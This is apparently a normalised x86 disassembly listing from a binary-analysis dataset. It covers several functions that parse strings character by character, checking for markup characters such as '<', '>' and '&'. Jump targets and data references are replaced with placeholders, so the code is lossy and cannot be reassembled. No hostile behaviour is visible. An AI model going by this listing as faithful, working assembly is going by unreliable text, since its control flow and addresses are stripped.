call sub_401e80
lea eax [ esp + 0x108 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x10c ]
push eax
mov ecx esi
call sub_401cc0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
add esi 0x4
mov [ esp + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ esp + 0x4 ] ecx
jmp r-xdata
push r--data
lea edx [ esp + 0x8 ]
push edx
call sub_4b5bd2
pop esi
nop
sub_4a42d0
push ecx
push ebx
push ebp
push esi
push edi
mov ebp ecx
mov eax [ ebp + 0x100a0 ]
lea edi [ ebp + 0x10088 ]
mov esi 0x10
push ecx
cmp eax esi
mov edx esp
lea eax [ edi + 0x4 ]
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ ecx ] eax
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_401c60
mov ecx ebp
call sub_44f680
lea esi [ ebp + 0x1000c ]
mov eax [ eax ]
mov ebx [ edi + 0x14 ]
add ebx ecx
mov [ edx ] ebx
cmp [ edi + 0x18 ] esi
push ecx
mov ecx esp
jb r-xdata
test eax eax
je r-xdata
inc eax
mov [ ebp + 0x1001c ] eax
jmp r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov ecx [ esi ]
mov bl [ ecx ]
push r--data
push esi
mov ecx ebp
mov [ esp + 0x18 ] bl
call sub_44f6e0
test al al
mov eax [ ebp + 0x1001c ]
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov dl bl
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
push r--data
push ebp
call sub_4a4220
add esp 0x8
push r--data
push esi
mov ecx ebp
call sub_44f6e0
test al al
je r-xdata
cmp bl 0x3c
je r-xdata
mov eax [ esp + 0x10 ]
push eax
push 0x1
mov ecx edi
call sub_4017f0
mov ecx [ esi ]
xor edx edx
mov dl [ ecx + 0x1 ]
mov ecx edi
push edx
push 0x1
call sub_4017f0
add [ esi ] 0x2
jmp r-xdata
xor bl 0x20
add bl 0x5f
cmp bl 0x3b
ja r-xdata
dec [ ebp + 0x1001c ]
jmp r-xdata
cmp bl 0x26
jne r-xdata
inc [ esi ]
jmp r-xdata
add [ esi ] 0x2
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
push 0x1
mov ecx edi
call sub_4017f0
mov eax [ esi ]
push r--data
inc eax
push esi
mov ecx ebp
mov [ esi ] eax
call sub_44f6e0
test al al
je r-xdata
push r--data
push esi
mov ecx ebp
call sub_44f6e0
test al al
je r-xdata
push 0x26
push 0x1
mov ecx edi
call sub_4017f0
jmp r-xdata
push r--data
push esi
mov ecx ebp
call sub_44f6e0
test al al
je r-xdata
push 0x3c
push 0x1
mov ecx edi
call sub_4017f0
jmp r-xdata
push 0x3e
push 0x1
mov ecx edi
call sub_4017f0
jmp r-xdata
sub_4a4460
push 0xffffffff
push sub_4c18e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4a44e0
push 0xffffffff
push sub_4c18e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4a4560
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebp
je r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ esp + 0x1c ]
lea ebx [ edi + 0x1c ]
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_401dd0
push 0xffffffff
push 0x0
push ebx
lea ecx [ esi + 0x1c ]
call sub_401dd0
add esi 0x38
cmp esi ebp
jne r-xdata
pop edi
pop ebx
sub_4a45a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c1911
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x38
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x38
jmp r-xdata
push edi
mov ecx esi
call sub_4a3d50
cmp edi [ ebp + 0xc ]
je r-xdata
sub_4a45fa
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x10 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x34 ]
lea esp [ esp ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x1c ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp + 0x10 ]
mov [ esi - 0x1c ] 0xf
mov [ esi - 0x20 ] ebx
mov [ esi - 0x30 ] bl
add edi 0x38
add esi 0x38
cmp edi eax
jne r-xdata
mov eax [ esi - 0x30 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_4a4680
push 0xffffffff
push sub_4c1938
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
push ebx
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
mov ecx [ rw-data ]
xor ebx ebx
lea eax [ ecx - 0x1 ]
cmp eax ecx
mov [ esp + 0x4c ] ebx
ja r-xdata
sub eax ecx
push ebx
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
push esi
lea eax [ esp + 0x2c ]
push r--data
push eax
call sub_40c3c0
push r--data
push eax
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x64 ] 0x1
call sub_402140
add esp 0x18
mov ecx [ rw-data ]
push 0xffffffff
push ebx
push eax
mov [ esp + 0x58 ] 0x2
call sub_4018c0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
push 0xffffffff
push ebx
push rw-data
call sub_4018c0
cmp [ rw-data ] bl
jne r-xdata
cmp [ esp + 0x40 ] 0x10
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
jb r-xdata
mov edx [ esp + 0x10 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi + 0x18 ] 0x10
mov [ rw-data ] bl
jb r-xdata
mov eax [ esp + 0x2c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x44 ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x48
retn
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4a47a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c19d4
push eax
mov [ fs : 0x0 ] esp
sub esp 0x280
push ebx
push ebp
mov ebp [ esp + 0x298 ]
mov eax [ ebp ]
mov cl [ eax ]
xor ebx ebx
cmp cl bl
push esi
push edi
je r-xdata
mov eax 0x1
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0xa4 ]
call sub_4a3f10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b4 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0xe0 ]
call sub_4a3f10
mov [ esp + 0x298 ] 0x1
xor eax eax
lea esp [ esp ]
lea ecx [ esp + 0xc4 ]
mov [ esp + 0x298 ] bl
call sub_4a4680
lea ecx [ esp + 0x88 ]
mov [ esp + 0x298 ] 0xffffffff
call sub_4a4680
xor eax eax
jmp r-xdata
cmp cl 0x3a
je r-xdata
mov ecx [ esp + 0x290 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x28c
retn
mov [ esp + eax + 0xe0 ] bl
cmp cl 0x2f
je r-xdata
lea eax [ esp + 0xe0 ]
mov [ esp + 0x84 ] 0xf
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
inc edx
mov [ esp + eax + 0xe0 ] cl
inc eax
cmp eax 0x1f
mov [ ebp ] edx
jl r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xe4 ]
push ecx
lea ecx [ esp + 0x74 ]
call sub_401e80
mov ecx [ rw-data ]
push 0xffffffff
push ebx
lea edx [ esp + 0x74 ]
push edx
mov [ esp + 0x2a4 ] 0x2
call sub_4018c0
cmp [ esp + 0x84 ] 0x10
jb r-xdata
mov edx [ ebp ]
mov cl [ edx ]
cmp cl bl
je r-xdata
jmp r-xdata
mov edi 0xf
lea ecx [ esp + 0xc4 ]
mov [ esp + 0x84 ] edi
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
mov [ esp + 0x298 ] bl
call sub_4a4680
sub esp 0x1c
mov esi esp
mov [ esi + 0x18 ] edi
mov eax r--data
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov eax [ esp + 0x70 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp eax 0x1f
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x170 ]
call sub_4a3f10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b4 ] 0x3
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x11c ]
call sub_4a3f10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b4 ] 0x4
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2d0 ] 0x5
mov [ esp + 0x4c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x138 ]
mov [ esp + 0x2d0 ] 0x4
call sub_4a4080
mov ecx [ ebp ]
cmp [ ecx ] 0x2f
mov [ esp + 0x10 ] ebx
jne r-xdata
inc [ ebp ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x138 ]
call sub_4a3f10
mov eax [ ebp ]
mov cl [ eax ]
xor esi esi
cmp cl bl
mov [ esp + 0x298 ] 0xa
je r-xdata
mov cl [ edx ]
cmp cl bl
je r-xdata
lea eax [ esp + 0x18c ]
mov [ esp + esi + 0x18c ] bl
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
lea edx [ eax + 0x1 ]
mov edi [ ebp ]
mov al [ edi ]
cmp al 0x7c
je r-xdata
lea ecx [ esp + 0x100 ]
mov [ esp + 0x298 ] 0x3
call sub_4a4680
lea ecx [ esp + 0x154 ]
mov [ esp + 0x298 ] bl
call sub_4a4680
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x30 ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
cmp cl 0x3a
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x190 ]
push ecx
lea ecx [ esp + 0x3c ]
call sub_401e80
mov ecx [ rw-data ]
or esi 0xffffffff
push esi
push ebx
lea edx [ esp + 0x3c ]
push edx
mov [ esp + 0x2a4 ] 0xb
call sub_4018c0
cmp [ esp + 0x4c ] 0x10
jb r-xdata
cmp al 0x3c
je r-xdata
mov [ esp + eax + 0xa4 ] bl
cmp cl 0x2f
je r-xdata
lea ecx [ esp + 0x11c ]
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
mov [ esp + 0x298 ] bl
call sub_4a4680
mov eax [ ebp ]
cmp [ eax ] 0x3c
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp al 0x3e
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
jne r-xdata
inc edx
mov [ esp + eax + 0xa4 ] cl
inc eax
cmp eax 0x40
mov [ ebp ] edx
jl r-xdata
mov ecx [ ebp ]
mov al [ ecx ]
cmp al 0x3e
je r-xdata
inc eax
push ebp
mov [ ebp ] eax
call sub_4a47a0
add esp 0x4
test eax eax
je r-xdata
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
cmp eax 0x1
jne r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x30 ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
jmp r-xdata
mov eax [ ebp ]
inc eax
lea ecx [ esp + 0x88 ]
mov [ ebp ] eax
mov [ esp + 0x298 ] esi
call sub_4a4680
cmp al 0x7c
jne r-xdata
lea ecx [ esp + 0x88 ]
mov [ esp + 0x298 ] esi
call sub_4a4680
xor eax eax
jmp r-xdata
mov eax [ ebp ]
mov dl [ eax ]
mov [ esp + esi + 0x18c ] dl
inc esi
inc eax
mov [ ebp ] eax
cmp [ eax ] bl
jne r-xdata
mov [ esp + esi + 0x18c ] al
inc esi
inc edi
mov [ ebp ] edi
mov ecx [ esp + 0x10 ]
mov edx [ ebp ]
mov al [ edx ]
inc ecx
cmp al 0x2f
mov [ esp + 0x10 ] ecx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x30 ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x18c ]
call sub_4a3f10
lea eax [ esp + 0xa4 ]
mov [ esp + 0x298 ] 0x6
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea esi [ eax + 0x1 ]
cmp eax 0x1f
je r-xdata
lea ecx [ esp + 0x88 ]
mov [ esp + 0x298 ] esi
call sub_4a4680
mov ecx [ ebp ]
cmp [ ecx ] bl
jne r-xdata
inc ecx
mov [ ebp ] ecx
mov eax [ ebp ]
inc eax
mov [ ebp ] eax
mov edx eax
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x154 ]
call sub_4a3f10
lea eax [ esp + 0xa4 ]
mov [ esp + 0x298 ] 0x8
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
lea edx [ esp + 0xa8 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_401e80
mov ecx [ rw-data ]
push 0xffffffff
push ebx
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x2a4 ] 0x7
call sub_4018c0
cmp [ esp + 0x30 ] 0x10
jb r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
lea edx [ esp + 0xa8 ]
push edx
lea ecx [ esp + 0x58 ]
call sub_401e80
mov ecx [ rw-data ]
push 0xffffffff
push ebx
lea eax [ esp + 0x58 ]
push eax
mov [ esp + 0x2a4 ] 0x9
call sub_4018c0
cmp [ esp + 0x68 ] 0x10
jb r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea ecx [ esp + 0x170 ]
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
lea ecx [ esp + 0x138 ]
mov ecx [ esp + 0x54 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x298 ] 0x4
call sub_4a4680
sub_4a4e90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1b77
push eax
mov [ fs : 0x0 ] esp
sub esp 0x27c
push ebx
push ebp
mov ebp [ esp + 0x294 ]
xor ebx ebx
cmp ebp ebx
push esi
push edi
jne r-xdata
mov eax [ esp + 0x2a0 ]
push eax
lea ecx [ esp + 0x38 ]
call sub_4a3e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b0 ] ebx
mov [ esp + 0x50 ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
lea esp [ esp ]
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x8c ]
call sub_4a3f10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2b0 ] 0x1
mov [ esp + 0x50 ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov ecx [ esp + 0x28c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x288
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2cc ] 0x2
mov [ esp + 0x4c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x2cc ] 0x1
call sub_4a4080
cmp [ ebp + 0x20c ] ebx
je r-xdata
mov edi 0x10
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x50 ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
cmp [ ebp + 0x180 ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x298 ] ebx
mov [ esp + 0x294 ] 0x3
mov edi 0x10
je r-xdata
cmp [ ebp + 0x19c ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x264 ] edi
mov [ esp + 0x294 ] 0x5
jb r-xdata
cmp [ ebp + 0x210 ] edi
jb r-xdata
cmp [ ebp + 0x29c ] edi
jb r-xdata
cmp [ ebp + 0x27c ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x2b4 ] ebx
mov [ esp + 0x294 ] 0x6
je r-xdata
lea eax [ ebp + 0x250 ]
mov eax [ ebp + 0x250 ]
jmp r-xdata
lea eax [ ebp + 0x1fc ]
mov eax [ ebp + 0x1fc ]
jmp r-xdata
lea eax [ ebp + 0x288 ]
mov eax [ ebp + 0x288 ]
jmp r-xdata
cmp [ ebp + 0x2d0 ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x1a0 ] edi
mov [ esp + 0x294 ] 0x8
jb r-xdata
cmp [ ebp + 0x184 ] edi
jb r-xdata
cmp [ ebp + 0x2b8 ] edi
jb r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
cmp [ ebp + 0x260 ] ebx
je r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
jmp r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
push eax
call sub_4024d0
sub esp 0x1c
mov ecx esp
mov [ esp + 0x48 ] esp
push r--data
mov [ esp + 0x2d0 ] 0x4
call sub_4024d0
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2cc ] 0x3
call sub_4a4080
cmp [ ebp + 0x68 ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x280 ] edi
mov [ esp + 0x294 ] 0x9
jb r-xdata
lea eax [ ebp + 0x18c ]
mov eax [ ebp + 0x18c ]
jmp r-xdata
lea eax [ ebp + 0x170 ]
mov eax [ ebp + 0x170 ]
jmp r-xdata
lea eax [ ebp + 0x2a4 ]
mov eax [ ebp + 0x2a4 ]
jmp r-xdata
cmp [ ebp + 0x340 ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x2d4 ] edi
mov [ esp + 0x294 ] 0xa
jb r-xdata
lea eax [ ebp + 0x26c ]
mov eax [ ebp + 0x26c ]
jmp r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
sub esp 0x1c
mov ecx esp
mov [ esp + 0x4c ] esp
push r--data
mov [ esp + 0x2d0 ] 0x7
call sub_4024d0
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2cc ] 0x6
call sub_4a4080
cmp [ ebp + 0x2ec ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x6c ] edi
mov [ esp + 0x294 ] 0xb
jb r-xdata
lea eax [ ebp + 0x2c0 ]
mov eax [ ebp + 0x2c0 ]
jmp r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
cmp [ ebp + 0x12c ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x34 ]
call sub_4a3f10
cmp [ ebp + 0x340 ] ebx
mov [ esp + 0x294 ] 0xc
je r-xdata
lea eax [ ebp + 0x58 ]
mov eax [ ebp + 0x58 ]
jmp r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_4024d0
lea ecx [ esp + 0x34 ]
call sub_4a3ca0
lea ecx [ esp + 0x18 ]
mov [ esp + 0x294 ] 0x1
call sub_4a4680
cmp [ ebp + 0x244 ] ebx
je r-xdata
sub esp 0x1c
mov esi esp
mov eax r--data
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ esi + 0x4 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401e80
lea ecx [ esp + 0x54 ]
call sub_4a3f10
